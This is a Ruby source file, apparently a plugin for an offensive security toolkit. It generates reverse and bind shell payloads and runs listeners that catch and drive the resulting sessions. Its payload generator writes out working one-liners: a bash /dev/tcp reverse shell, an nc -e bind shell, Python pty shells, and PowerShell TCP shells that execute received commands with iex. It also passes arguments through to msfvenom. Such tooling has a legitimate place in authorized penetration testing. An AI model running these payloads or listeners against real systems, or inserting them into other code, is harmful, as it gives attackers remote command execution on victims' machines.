# frozen_string_literal: true

require 'socket'
require 'openssl'
require 'securerandom'
require 'open3'

module PWN
  module Plugins
    # Payload generation and listener sessions without Metasploit.
    module Handler
      @sessions = {}

      public_class_method def self.required_bins
        []
      end

      public_class_method def self.generate(opts = {})
        kind = (opts[:kind] || 'rev_sh').to_s
        host = (opts[:host] || '127.0.0.1').to_s
        port = (opts[:port] || 4444).to_i
        payload = case kind
                  when 'rev_sh' then "bash -c 'exec 3<>/dev/tcp/#{host}/#{port}; cat <&3 | bash >&3'"
                  when 'bind_sh' then "bash -c 'while true; do nc -lp #{port} -e /bin/bash; done'"
                  when 'rev_python' then "python3 -c 'import socket,os,pty;s=socket.create_connection((#{host.inspect},#{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
                  when 'bind_python' then "python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"0.0.0.0\",#{port}));s.listen(1);c,_=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/sh\")'"
                  when 'rev_powershell' then "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('#{host}',#{port});$s=$c.GetStream();[byte[]]$b=0..65535|ForEach-Object{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=($r+'PS> ');$s.Write(([text.encoding]::ASCII).GetBytes($w),0,$w.Length)}\""
                  when 'bind_powershell' then "powershell -nop -c \"$l=New-Object Net.Sockets.TcpListener('0.0.0.0',#{port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|ForEach-Object{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=($r+'PS> ');$s.Write(([text.encoding]::ASCII).GetBytes($w),0,$w.Length)}\""
                  when 'msfvenom'
                    raise ArgumentError, 'msfvenom is not installed' unless PWN::Plugins::PreflightChecker.bin?(name: 'msfvenom')

                    out, = Open3.capture2('msfvenom', *Array(opts[:args]).map(&:to_s))
                    out
                  else
                    raise ArgumentError, "unknown payload kind #{kind}"
                  end
        { kind: kind, host: host, port: port, payload: payload }
      end

      public_class_method def self.listen(opts = {})
        port = (opts[:port] || 4444).to_i
        tls = opts[:tls] == true
        http = opts[:http] == true || opts[:kind].to_s == 'http'
        server = TCPServer.new(opts[:bind] || '127.0.0.1', port)
        if tls
          ctx = OpenSSL::SSL::SSLContext.new
          ctx.cert, ctx.key = self_signed
          server = OpenSSL::SSL::SSLServer.new(server, ctx)
        end
        id = "listener_#{SecureRandom.hex(4)}"
        queue = Queue.new
        thread = Thread.new do
          sock = server.accept
          if http
            begin
              sock.readpartial(4096)
            rescue StandardError
              nil
            end
          end
          queue << sock
        end
        @sessions[id] = { server: server, thread: thread, queue: queue, port: port, tls: tls, http: http, kind: :listener }
        { id: id, port: port, tls: tls, http: http }
      end

      public_class_method def self.accept(opts = {})
        sess = session!(opts)
        sock = sess[:queue].pop
        PWN::Plugins::ProcessTube.register(io: sock, id: "cb_#{SecureRandom.hex(4)}").tap do |tube|
          sess[:callback] = tube[:id]
        end.merge(listener: sess_id(opts), port: sess[:port])
      end

      public_class_method def self.interact(opts = {})
        id = (opts[:id] || opts[:session]).to_s
        PWN::Plugins::ProcessTube.write_line(id: id, line: opts[:line].to_s) if opts[:line]
        if opts[:pattern]
          PWN::Plugins::ProcessTube.expect(id: id, pattern: opts[:pattern], timeout: opts[:timeout] || 5, strip_ansi: true)
        else
          PWN::Plugins::ProcessTube.recvline(id: id, timeout: opts[:timeout] || 5)
        end
      end

      public_class_method def self.stop(opts = {})
        id = (opts[:id] || opts[:handle]).to_s
        sess = @sessions.delete(id)
        sess[:server].close if sess && sess[:server]
        { stopped: id }
      end

      public_class_method def self.authors
        "AUTHOR(S):\n  0day Inc. <support@0dayinc.com>\n"
      end

      public_class_method def self.help
        puts "USAGE:
          # List host binaries this module expects to be installed.
          #{self}.required_bins

          # Generate a reverse or bind payload string without Metasploit.
          #{self}.generate(
            kind: 'optional - rev_sh, bind_sh, rev_python, bind_python, rev_powershell, bind_powershell, or msfvenom',
            host: 'optional - callback host (defaults to 127.0.0.1)',
            port: 'optional - callback or bind port (defaults to 4444)',
            args: 'optional - extra argv for msfvenom passthrough'
          )

          # Start a TCP or TLS listener on loopback.
          #{self}.listen(
            port: 'optional - listen port (defaults to 4444)',
            bind: 'optional - bind address (defaults to 127.0.0.1)',
            tls: 'optional - true to wrap the listener in TLS',
            http: 'optional - true to accept an HTTP reverse callback',
            kind: 'optional - http to enable the HTTP listener'
          )

          # Accept one callback and register it as a ProcessTube session.
          #{self}.accept(
            id: 'required - listener id from listen',
            handle: 'optional - alias for id'
          )

          # Send a line and optionally expect a pattern on a caught session.
          #{self}.interact(
            id: 'required - callback id from accept',
            session: 'optional - alias for id',
            line: 'optional - command to send',
            pattern: 'optional - regex or string to wait for',
            timeout: 'optional - seconds to wait'
          )

          # Stop a listener handle.
          #{self}.stop(
            id: 'required - listener id from listen',
            handle: 'optional - alias for id'
          )

          # Print the AUTHOR(S) string for this module.
          #{self}.authors
        "
        constants.sort
      end

      private_class_method def self.session!(opts = {})
        id = (opts[:id] || opts[:handle]).to_s
        sess = @sessions[id]
        raise ArgumentError, "unknown handler session #{id}" unless sess

        sess
      end

      private_class_method def self.sess_id(opts = {})
        (opts[:id] || opts[:handle]).to_s
      end

      private_class_method def self.self_signed
        key = OpenSSL::PKey::RSA.new(2048)
        cert = OpenSSL::X509::Certificate.new
        cert.subject = cert.issuer = OpenSSL::X509::Name.parse('/CN=pwn-handler')
        cert.not_before = Time.now
        cert.not_after = Time.now + 3_600
        cert.public_key = key.public_key
        cert.serial = 1
        cert.version = 2
        cert.sign(key, OpenSSL::Digest.new('SHA256'))
        [cert, key]
      end
    end
  end
end
